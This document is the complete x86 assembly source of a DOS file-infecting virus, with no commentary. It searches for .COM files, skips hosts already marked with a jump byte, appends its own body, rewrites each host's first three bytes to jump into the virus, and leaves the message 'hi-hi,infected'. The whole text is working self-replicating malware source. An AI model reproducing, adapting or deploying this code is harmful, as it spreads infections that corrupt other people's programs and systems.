   code  segment
         assume cs:code,ds:code

          org 100h
   start:
       db  0e9h
       dw  0dh
   id  dw  09090h
       mov ah,4ch
       int 21h
       org 110h
   virus:
       push    ds
       push    es
       mov ax,cs
       db  00000101b
   new_ds  dw  0h
       mov ds,ax
       mov es,ax

   restore_3_bytes:

       mov al,byte ptr bytes_3
       mov byte ptr cs:[100h],al

       mov al,byte ptr bytes_3[1]
       mov byte ptr cs:[101h],al

       mov al,byte ptr bytes_3[2]
       mov byte ptr cs:[102h],al

   store_dta:
       mov cx,80h
       mov bx,0
   dta_s:
       mov al,byte ptr cs:[bx+80h]
       mov byte ptr dta[bx],al
       inc bx
       loop    dta_s

   find_first:
       lea dx,fmask
       mov cx,00100000b
       mov ah,4eh
       int 21h
       jnc store_fname
       jmp err

   find_next:
       mov bx,handle
       mov ah,3eh
       int 21h

       mov handle,0ffffh
       mov ah,4fh
       int 21h
       jnc store_fname
       jmp err
   store_fname:
       mov bx,0
       mov cx,13
   e:

       mov al,byte ptr cs:[09eh+bx]
       mov byte ptr fname[bx],al
       inc bx
       loop    e

   read_handle:
       lea dx,fname
       mov ax,3d02h
       int 21h
       jnc read_3_bytes
       jmp err

   read_3_bytes:
       mov handle,ax
       lea dx,bytes_3
       mov bx,ax
       mov cx,3
       mov ah,3fh
       int 21h
       jnc read_flen
       jmp err

   read_flen:
       xor cx,cx
       mov dx,cx
       mov bx,handle
       mov ax,4202h
       int 21h
       jnc check_id
       jmp err

   check_id:
       mov flenold,ax
       test    ax,00001111b
       jz  just
       or  ax,00001111b
       inc ax

   just:
       mov flen,ax
       cmp ax,64000
       jna calc_ds
       jmp find_next

   calc_ds:
       mov cl,4
       shr ax,cl
       dec ax
       mov byte ptr new_ds,   al
       mov byte ptr new_ds[1],ah

       mov cx,0
       mov dx,cx
       mov bx,handle
       mov ax,4200h
       int 21h
       jc  err

   read_id:
       lea dx,bytes_3
       mov bx,handle
       mov cx,1
       mov ah,3fh
       int 21h
       jc  err

       cmp byte ptr bytes_3,0e9h
       jne not_infected
       jmp find_next

   not_infected:
       mov ax,flen
       sub ax,03h
       mov jmp_l,al
       mov jmp_h,ah

       mov cx,0
       mov dx,flen
       mov bx,handle
       mov ax,4200h
       int 21h
       jc  err

       lea dx,virus
       mov cx,virlen
       mov bx,handle
       mov ah,40h
       int 21h
       jc  err

   write_jmp:
       xor dx,dx
       mov cx,dx
       mov bx,handle
       mov ax,4200h
       int 21h
       jc  err

       lea dx,jmpvir
       mov cx,3
       mov bx,handle
       mov ah,40h
       int 21h
       jc  err
       jmp find_next

   err:
       cmp  handle,0ffffh
       je  close_file
       jmp find_next

   close_file:
       mov bx,handle
       mov ah,3eh
       int 21h

   restore_dta:

       mov cx,80h
       mov bx,0
   dta_r:
       mov al,byte ptr dta[bx]
       mov byte ptr cs:[bx+80],al
       inc bx
       loop    dta_r

       mov ax,cs
       mov ds:[start_s],ax

       pop es ds

       push    100h
       ret
   ;   db  0eah
   ;   dw  100h
   start_s dw  ?

   fmask   db  '*.com',0
   fname   db  12 dup(0),0
   flenold dw  ?
   flen    dw  ?
   handle  dw  0ffffh
   jmpvir  db  0e9h
   jmp_l   db  ?
   jmp_h   db  ?
   bytes_3 db  90h,90h,90h
   dta db  80h dup(?)
   msg db  'hi-hi,infected'

   virlen  equ $-virus

   code  ends
       end start
